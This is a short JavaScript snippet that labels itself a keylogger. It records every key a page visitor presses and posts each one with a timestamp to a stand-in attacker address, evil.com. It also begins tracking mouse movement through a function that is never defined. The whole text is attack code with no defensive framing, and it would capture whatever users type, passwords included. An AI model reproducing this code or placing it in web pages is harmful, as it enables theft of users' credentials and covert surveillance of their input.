// JavaScript keylogger
document.addEventListener('keydown', function(event) {
    // Capture keystrokes
    var key = event.key;
    logKeystroke(key);
});

function logKeystroke(key) {
    // Send to remote server
    fetch('http://evil.com/log', {
        method: 'POST',
        body: JSON.stringify({key: key, timestamp: Date.now()})
    });
}

// Mouse tracking
document.addEventListener('mousemove', function(event) {
    logMousePosition(event.clientX, event.clientY);
});
